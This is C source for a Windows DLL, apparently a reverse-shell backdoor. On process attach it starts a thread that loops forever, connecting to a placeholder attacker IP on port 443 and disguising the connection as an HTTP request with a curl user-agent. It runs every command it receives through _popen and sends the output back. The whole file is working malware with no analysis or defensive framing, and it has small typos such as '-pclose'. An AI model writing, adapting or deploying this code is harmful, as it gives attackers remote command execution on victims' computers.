#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#define EXPORT __declspec(dllexport)

void rev(){
    WSADATA data;
    WSAStartup(MAKEWORD(2,2),&data);
    SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    if(sock != INVALID_SOCKET){
        struct sockaddr_in addr = {
            .sin_addr.s_addr = inet_addr("<IP>"),
            .sin_family = AF_INET,
            .sin_port = htons(443)
        };
        if(!WSAConnect(sock,(struct sockaddr *)&addr,sizeof(addr),NULL,NULL,NULL,NULL)){
            char http[] =
            "GET / HTTP/1.1\r\n"
            "Host: <HOST>\r\n"
            "Connection: keep-alive\r\n"
            "User-Agent: curl"
            "Accept: */*\r\n\r\n";
            if(send(sock,http,strlen(http),0)!=SOCKET_ERROR){
                char rcv[1024] = {};
                char tmp[1024] = {};
                if(recv(sock,rcv,sizeof(rcv),0) >0){
                    do{
                        FILE *f = _popen(rcv,"r");
                        while(fgets(tmp,sizeof(tmp),f)){
                            if(send(sock,tmp,strlen(tmp),0) == SOCKET_ERROR)
                                break;
                        }
                        -pclose(f);
                        ZeroMemory(rcv,sizeof(rcv));
                        ZeroMemory(tmp,sizeof(tmp));
                    }while(recv(sock,rcv,sizeof(rcv),0) > 0);
                }
            }
        }
    }
    closesocket(sock);
    WSACleanup();
}
DWORD WINAPI souzomain(LPVOID lpParam){
    while(1)
        rev();    
    return 0;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason,LPVOID lpReserved){
    HANDLE tt;
    if(fdwReason == DLL_PROCESS_ATTACH)
        tt = CreateThread(0,0,souzomain,0,0,0);
    return TRUE;
}
